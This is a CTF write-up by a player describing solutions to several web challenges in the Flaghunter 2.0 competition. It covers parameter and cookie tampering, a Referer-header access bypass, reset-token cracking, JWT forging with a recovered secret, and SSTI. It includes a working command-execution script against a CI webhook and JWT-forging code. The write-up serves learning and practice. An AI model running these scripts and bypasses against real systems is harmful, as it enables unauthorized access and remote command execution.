Hey folks, I’m Adham Khairy — aka 0xSponge.
Over the last 48 hours I went solo into Flaghunter 2.0 CTF, hosted by Security BSides Vizag and sponsored by INE.
It was an intense, all-by-myself grind across web, reverse, crypto, and forensics challenges — and I managed to land in the top 10 out of ~800 global players.
This write-up covers the challenges I solved, my reasoning, and the techniques I used to snag the flags.

Let’s start with my favorite battleground — the Web.

🕸️ Challenge: Deal or No Deal “100 pts”

Looks like a boring login form — snooze. 😴 Then I peeked at the source and found the dev’s secret stash: credentials just chilling in plain text. Logged in faster than they could say “oh no.” 🎯

After logging in I hit the “cookies shop” page. Nothing fancy visually, but sending the purchase request through Burp revealed a hidden discount parameter in the POST body. That param wasn’t in the UI — suspicious. Time to tamper the value and see how the backend validates (or doesn’t).

I tampered the POST and set discount=100. Sent the request and waited for the backend to choke — or happily accept my free cookies. Time to see if the server enforces limits or blindly trusts the client.

Boom — flag grabbed. Instant win. Moving on to the next challenge.

💻 Challenge: ShadowDocs (100 pts)

At first glance the app only exposes a few features — register and login. I spun up a new account and started poking around endpoints and hidden flows to see what the app actually exposes.

The dashboard had an upload form for documents that listed uploads as pending approval. I uploaded a file to see how the app handled processing and whether the approval workflow could be abused.

Got a 401 Unauthorized when trying to approve — only admins can approve uploads. Time to find or hijack an admin account.

Checked the cookies — there was a role=user attribute. Swapped it to role=admin (via DevTools ) and the app trusted it. Classic client-side authorization: cookie tampering -> immediate admin access.

Second flag captured. Admin access granted via cookie tampering — moving on.

👻 Challenge: Phantom Referer (200 pts)

Another dull login page again exposing the username user — obvious start is password guessing, but something felt off. Time to probe deeper: check hidden fields, JS, cookies, headers, and any client-side logic that might leak or compute the password.

Brute-forced dirs and hit /admin — 403 Forbidden. Classic. Time to probe for alternative entry points: check allowed methods, auth headers, referer/origin tricks.

Tried every bypass under the sun — allowed methods, cookies, weird headers — then hit gold: setting Referer: http://localhost in the request unlocked the /admin panel. Classic server-side referer check trusting client-controlled headers. Admin access obtained.

Finally hit /admin/documents/doc4.txt and it spat the flag. With Referer-based ACL bypass → admin panel → direct file access, game over for that endpoint. Flag grabbed, moving to the next target.

🕶️ Challenge: Midnight Token (200 pts)

Another login page — but this one had a forgot password flow. That’s the new attack surface: time to enumerate the reset flow, inspect tokens, email callbacks, and any client-side logic that could be abused.

I tested the “forgot password” workflow and observed that, while the HTTP traffic showed no anomalies, a password-reset email was issued containing a token. I captured the token and proceeded to analyze its format, lifetime, and validation mechanism.

I tried decoding that token like it was a secret muffin recipe — Base64, ROT13, URL-encode, hex… nada. So I switched to the “smash it with a hammer” approach and treated it as a hash. Cracked it (Internet magic) and out popped my email like a resurrected ghost. Token: 0 — Me: 1. 👻🔓

Found admin@securiumx.com in the source, and the cracked token let me hijack the reset flow — I reset the admin password and logged in as admin.

🛒 Challenge: Broken Shop (200 pts)

Looks like a boring shop — perfect cover. I played customer for a minute, clicked around, and snooped on the HTTP traffic like a nosy shopper peeking at the receipt. Time to see what the backend forgot to hide. 🛍️🔎

The POST /ci/webhook endpoint accepted JSON { "token": "...", "cmd": "..." } and immediately returned a build_id.

Later, GET /ci/artifacts/<build_id> returned whatever the worker wrote to stdout — which meant the worker executed my cmd.

What I did :

  • POST a payload containing cmd.
  • Read the returned build_id.
  • Poll /ci/artifacts/<build_id> until the artifact appears.
  • Decode output (I used base64 to keep things tidy).
python
#!/usr/bin/env python3
import requests, time, base64

BASE="http://64.227.184.4:6555"
T="NC-1f69c7f1ba7d"

def send(cmd):
  r=requests.post(f"{BASE}/ci/webhook", json={"token":T,"cmd":cmd})
  return r.json().get("build_id")

def poll(bid,wait=0.5,timeout=20):
  for _ in range(int(timeout/wait)):
    r=requests.get(f"{BASE}/ci/artifacts/{bid}")
    if r.status_code==200 and r.json().get("artifact"):
      return r.json()["artifact"]
    time.sleep(wait)
  raise SystemExit("no artifact")

bid=send('bash -lc "cat /flag.txt | base64 -w0"')
artifact=poll(bid)
print(base64.b64decode(artifact).decode(errors="replace"))

🤓​ Challenge: Logic Login (300 pts)

The login logic was trivial to bypass — removing the password parameter from the request let me pass the auth check. I ended up authenticated as a normal user.

The source code included an interesting dev comment:

“JWTs only, no forms allowed. You are not admin. Bring your own token? 🤔 (hint) Dev notes: We had to roll back SSO last minute. Secret rotation pending. Backups were moved to /static/backup.key.enc.”

That screams misconfiguration. The mention of JWTs and an encrypted backup hints that the signing key or a previous secret might be recoverable. Time to check /static/backup.key.enc — it might contain an old JWT secret or a way to forge admin tokens.

The encrypted backup (backup.key.enc) contained an obfuscated string “dbgre:drterc:vsz~y:|rn” which, after applying a simple XOR with 0x17, yielded the application’s JWT secret.

python
s = open('backup.key.enc','rb').read()
decoded = bytes([b ^ 0x17 for b in s])
print(decoded.decode())
#Output
#super-secret-admin-key

Using this recovered secret I was able to generate a valid JSON Web Token and authenticate. This indicates insecure backup storage and inadequate secret management.

python
import jwt, time
secret = "super-secret-admin-key"
header = {"alg": "HS256", "typ": "JWT"}
payload = {
"sub": "admin",
"role": "admin",
"iat": int(time.time()),
"exp": int(time.time()) + 3600
}
token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print(token)

🕶️ Challenge: NovaCorp Intelligence Portal (300 pts)

The dashboard exposes three features: Report Builder (preview), Save Filter, and Export CSV. Those export and preview flows are prime targets — look for injection in report templates, improper filter sanitization (leading to injection/logic flaws), and CSV export issues.

I injected a classic SSTI probe {{7*7}} into the Report Builder template field to see if the renderer evaluated it. If the page renders 49, we've got server-side template injection — time to escalate to payloads that read files or execute commands.

Boom — {{7*7}} returned 49. Confirmed SSTI. Next move: fingerprint the template engine, probe for exploitable objects (builtins/__mro__/__subclasses__), and escalate via engine-specific primitives toward RCE.

We escalated to root, ran ls and spotted app.py. Opened the source and started hunting for juicy items — hardcoded secrets, dangerous functions, odd endpoints, or logic flaws that could be abused.
